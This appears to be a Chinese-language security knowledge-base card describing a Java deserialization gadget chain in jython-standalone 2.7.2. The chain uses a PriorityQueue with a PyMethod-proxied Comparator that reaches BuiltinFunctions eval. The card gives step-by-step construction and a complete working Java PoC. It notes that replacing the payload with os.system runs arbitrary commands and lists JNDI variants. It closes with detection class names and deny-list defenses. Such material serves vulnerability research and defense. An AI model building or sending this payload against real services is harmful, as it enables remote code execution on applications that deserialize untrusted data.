---
id: web-java-deser-jython-pymethod-proxy-builtin-eval
title: Jython 2.7.2 反序列化 gadget：PriorityQueue 代理 PyMethod → BuiltinFunctions#eval（index=18）执行 Python 代码
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: jython-pymethod-invocationhandler-builtinfunction-eval
tags:
- java
- deserialization
- jython
- pymethod
- builtinfunction
- priorityqueue
- comparator
- dynamic-proxy
- python
- rce
- gadget-chain
cve: []
severity: critical
confidence: high
affected_versions: jython-standalone 2.7.2
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V539
  verified_at: '2026-11-11T18:51:53+08:00'
  notes: 已对照原文 content.md 与全部 14 张截图逐项核对（图 01-07）：PyMethod.extends PyObject implements InvocationHandler、invoke 转发、instancemethod___call__ 取 __func__.__call__、BuiltinFunctions switch(index) case 18 -> __builtin__.eval、readResolve 阻断 PyFunction、PriorityQueue+代理触发链与 PoC 均与原文一致；pom 明确 jython-standalone 2.7.2，CVE-2023-39475/39476 原文仅为 Ignition 背景未归因 Jython。验证中修正：BuiltinFunctions 继承链补上截图中可见的 PyBuiltinFunctionSet 层。dedup 候选均为其他 PriorityQueue/Comparator 链，无同 CVE/同 sink。未验证点：PoC 未本机复跑；原文未给该 gadget 的独立 CVE。
url: /docs/web/java/deserialization/comparator/web-java-deser-jython-pymethod-proxy-builtin-eval/
draft: false
kb_aliases:
- Jython Gadgets Chain
- PyMethod InvocationHandler
- BuiltinFunctions index 18
- jython-standalone 2.7.2 RCE
- Ignition CVE-2023-39475 利用链
- PyFunction readResolve 异常
---

## 一句话结论

jython-standalone 2.7.2 中 `org.python.core.PyMethod` 继承 `PyObject` 且实现 `InvocationHandler`，`invoke()` 会把它持有的 `__func__` 当作可调用对象转发；攻击者把 `PyMethod` 作为 `Comparator` 动态代理的 handler 放进 `PriorityQueue` 的序列化数据，目标端 `readObject` 的 heapify 触发 `compare` → `PyMethod.invoke` → `__func__.__call__`，当 `__func__` 为 `BuiltinFunctions` 且 index 被设为 18 时调用 `__builtin__.eval`，在目标 JVM 内执行任意 Python 代码（Ignition Automation CVE-2023-39475/39476 所缺的公开利用链思路）。

## 原理

- **PyMethod 是 InvocationHandler**：`public class PyMethod extends PyObject implements InvocationHandler, Traverseproc`，字段 `im_class`（PyObject）与 `__func__`（PyObject）。`invoke(proxy, method, args)` 中，若方法声明类不是 `Object.class`，就执行 `this.__call__(Py.javas2pys(args)).__tojava__(method.getReturnType())`，把 Java 接口调用转成 Python 对象调用。
- **调用转发**：`PyMethod.__call__` → `instancemethod___call__`：先 `checkSelf(null, args)` 校验 `im_class`（`checkSelf` 要求 `im_class` 与 PyArgs 指定的类型一致，否则失败），再执行 `this.__func__.__call__(state, args, keywords)`。因此 `__func__` 指向谁，就调用谁的 `__call__`。
- **终端 BuiltinFunctions**：`org.python.core.BuiltinFunctions` 继承链为 `PyObject → PyBuiltinCallable → PyBuiltinFunction → PyBuiltinFunctionNarrow → PyBuiltinFunctionSet → BuiltinFunctions`（图 05）。其 `__call__` 按 `this.index` 做 switch，`case 18: return __builtin__.eval(arg1, arg2, (PyObject) arg3);` —— 即执行 Python 表达式/代码。索引 18 是硬编码的 eval 分支。
- **触发链**：`ObjectInputStream.readObject` → `PriorityQueue.readObject` → `heapify` → `siftDownUsingComparator` → 动态代理的 `compare` → `PyMethod.invoke` → `PyMethod.__call__` → `instancemethod___call__` → `__func__.__call__` → `BuiltinFunctions.__call__` → `__builtin__.eval` → `Py.runCode`。把 comparator 设成 `Comparator` 接口的代理、handler 设为 `PyMethod` 即可。
- **为什么不用 PyFunction**：2.7.2 的 `PyFunction` 重写了 `readResolve()` 并直接 `throw new UnsupportedOperationException()`，反序列化阶段即失败；`PyMethod` 没有该限制，因此被选为代理 handler。
- **payload 构造要点**：`PyMethod`/`BuiltinFunctions` 的字段没有公开构造路径，POC 用 `sun.misc.Unsafe.allocateInstance` 直接分配实例，再反射写字段；`index` 字段在 `BuiltinFunctions` 的父类上，需要 `getSuperclass().getDeclaredField("index")` 设置；`PyStringMap` 里放 `rs` 键值，脚本为 `__import__('code').InteractiveInterpreter().runcode(rs)`，实际执行的 Python 代码放在 `rs` 对应值中。

## 触发条件

- 目标应用 classpath 中存在 `jython-standalone` 2.7.2（或行为一致的其他 2.7.x 打包；原文测试 2.7.2）。
- 应用存在 Java 原生反序列化入口（`ObjectInputStream.readObject` 处理攻击者可控数据）。
- 目标允许反序列化 `org.python.core.*` 类（未用 JEP 290 类过滤器/黑名单拦截；仅在 payload 构造端需要 `Unsafe`，目标端不需要）。
- Jython 解释器可执行 Python 代码（默认可用，可用 `__import__('java')` 等访问 Java 类）。

## 利用步骤

1. 用 `Unsafe.allocateInstance` 分配 `PyMethod` 与 `BuiltinFunctions` 实例（绕过构造器）。
2. 反射把 `BuiltinFunctions.index` 设为 18（触发 `__builtin__.eval` 分支）。
3. 设置 `pyMethod.__func__ = builtinFunctions`；`pyMethod.im_class = new PyString().getType()`（满足 `checkSelf` 的类型校验）。
4. 构造 `PyStringMap`：键 `rs` 值为要执行的 Python 代码；`PriorityQueue` 的 `queue` 数组填 `[new PyString("__import__('code').InteractiveInterpreter().runcode(rs)"), locals]`，`size` 设为 2。
5. 以 `PyMethod` 为 handler 创建 `Comparator` 动态代理，作为 `PriorityQueue` 的比较器；构造好队列后序列化并发送给目标。
6. 目标 `readObject` 时 heapify 触发 `compare`，进入上述调用栈执行 Python 代码；原文验证 `print('Hello World')` 在目标端 Python 交互解释器中输出。

## PoC

```java
import org.python.core.*;
import sun.misc.Unsafe;
import java.io.*;
import java.lang.reflect.*;
import java.util.*;

public class Main {
    public static void main(String[] args) throws Exception {
        Field uf = Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        Unsafe unsafe = (Unsafe) uf.get(null);

        PyMethod pyMethod = (PyMethod) unsafe.allocateInstance(PyMethod.class);
        PyObject builtinFunctions = (PyObject) unsafe.allocateInstance(Class.forName("org.python.core.BuiltinFunctions"));

        Field index = builtinFunctions.getClass().getSuperclass().getDeclaredField("index");
        index.setAccessible(true);
        index.set(builtinFunctions, 18);

        pyMethod.__func__ = builtinFunctions;
        pyMethod.im_class = new PyString().getType();

        HashMap<Object, PyObject> _args = new HashMap<>();
        _args.put("rs", new PyString("print('Hello World')"));
        PyStringMap locals = new PyStringMap(_args);

        Object[] queue = new Object[]{
                new PyString("__import__('code').InteractiveInterpreter().runcode(rs)"),
                locals,
        };

        Comparator o = (Comparator) Proxy.newProxyInstance(Main.class.getClassLoader(),
                new Class[]{Comparator.class}, pyMethod);

        PriorityQueue<Object> pq = new PriorityQueue<Object>(2, o);
        Field f = pq.getClass().getDeclaredField("queue");
        f.setAccessible(true);
        f.set(pq, queue);
        Field f2 = pq.getClass().getDeclaredField("size");
        f2.setAccessible(true);
        f2.set(pq, 2);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        new ObjectOutputStream(baos).writeObject(pq);
        new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray())).readObject();
    }
}
```

- 目标端执行的 Python 等价于 `python -c "__import__('code').InteractiveInterpreter().runcode('print(\"Hello World\")')"`；把 `rs` 换成 `__import__('os').system('...')` 即可执行系统命令。
- 原文 pom：`org.python:jython-standalone:2.7.2`。
- 反序列化数据中的关键类：`org.python.core.PyMethod`、`org.python.core.BuiltinFunctions`、`org.python.core.PyStringMap`、`java.util.PriorityQueue`、`com.sun.proxy.$ProxyX`。

## 变体与关联

- 变体：同一触发链把 `__func__` 换成 `com.ziclix.python.sql.connect.Lookup`，第一参数作为 JNDI 名传入 `InitialContext.lookup()`，见关联卡 [[web-java-deser-jython-pymethod-proxy-lookup-jndi]]。
- 变体：低版本 jython（<=2.5.2）的 `PyFunction` 未重写 `readResolve`，可用 `PyFunction` 代理 + `PyBytecode` 执行 Python 字节码，见关联卡 [[web-java-deser-jython-pyfunction-pybytecode]]。
- 变体：`PyMethod.__func__` 可指向其他 `PyObject` 子类的 `__call__`（如 `com.ziclix`、`org.python.modules` 内暴露的方法），按目标 classpath 扩展。
- 关联：[[web-java-deser-comparator-priorityqueue]]（PriorityQueue 比较器触发通用构造）；[[web-java-deser-spring-aop-aspectjaroundadvice-priorityqueue-jndi]]（同样用 PriorityQueue + 动态代理/反射进入 sink 的思路）。
- 背景：IGNITION AUTOMATION 公开的 CVE-2023-39475、CVE-2023-39476 为反序列化 RCE，原文即分析其可能使用的 Jython 利用链；本卡描述的是 jython-standalone 的 gadget 本体，不把 CVE 归因给 Jython。

## 检测与防御

- 检测：反序列化流量/字节流中出现 `org.python.core.PyMethod`、`org.python.core.BuiltinFunctions`、`org.python.core.PyStringMap`、`com.ziclix.python.sql.connect.Lookup` 等 jython 类名；`java.util.PriorityQueue` 携带动态代理 comparator 的序列化数据。
- 检测：应用日志/堆栈中出现 `PyMethod.invoke`、`BuiltinFunctions.__call__`、`__builtin__.eval` 调用；Jython 解释器在非业务路径执行脚本。
- 防御：升级/移除 jython-standalone 2.7.2（该 gadget 依赖其类结构，官方无针对此链的单独补丁时应直接移除不必要的 Jython 依赖）；对 Java 原生反序列化入口启用 JEP 290 `ObjectInputFilter`，把 `org.python.*`、`com.ziclix.*` 及 `java.util.PriorityQueue`+代理组合列入拒绝名单。
- 防御：禁止对不可信数据使用 `ObjectInputStream`，改用 JSON 等数据格式；限制 Python/Jython 脚本能力或整个解释器在生产环境的可用性。
